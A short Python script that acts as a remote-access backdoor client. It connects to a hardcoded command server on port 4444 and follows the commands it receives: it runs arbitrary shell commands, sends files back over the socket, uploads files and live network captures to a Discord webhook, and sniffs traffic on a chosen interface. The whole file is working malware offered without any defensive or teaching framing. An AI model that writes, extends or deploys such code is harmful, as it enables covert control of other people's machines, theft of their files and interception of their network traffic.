import socket
import subprocess
import os
import requests
import pyshark

def upload_file(file_name, client_socket):
    with open(file_name, 'rb') as f:
        client_socket.sendall(f.read())
    return f"{file_name} uploaded."

def send_dsc(file_name, client_socket):
    # Implement your Discord webhook URL here
    webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
    with open(file_name, 'rb') as f:
        response = requests.post(webhook_url, files={"file": f})
    return f"{file_name} sent to Discord with response: {response.status_code}"

def execute_command(command):
    return subprocess.check_output(command, shell=True).decode()

def capture_traffic(interface, file_name):
    capture = pyshark.LiveCapture(interface=interface)
    capture.sniff(timeout=10)
    capture.save(file_name)
    return file_name

def client_loop(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        server_command = client.recv(4096).decode()
        if server_command:
            cmd_parts = server_command.split()
            cmd = cmd_parts[0]

            if cmd == "upload":
                file_name = cmd_parts[1]
                response = upload_file(file_name, client)
            elif cmd == "send":
                file_name = cmd_parts[2]
                response = send_dsc(file_name, client)
            elif cmd == "exec":
                command = ' '.join(cmd_parts[1:])
                response = execute_command(command)
            elif cmd == "cap":
                interface = cmd_parts[1]
                file_name = cmd_parts[3]
                capture_traffic(interface, file_name)
                response = send_dsc(file_name, client)
            elif cmd == "exit":
                break
            else:
                response = "Invalid command."

            client.send(response.encode())

if __name__ == "__main__":
    server_ip = "10.0.1.32"
    server_port = 4444
    client_loop(server_ip, server_port)
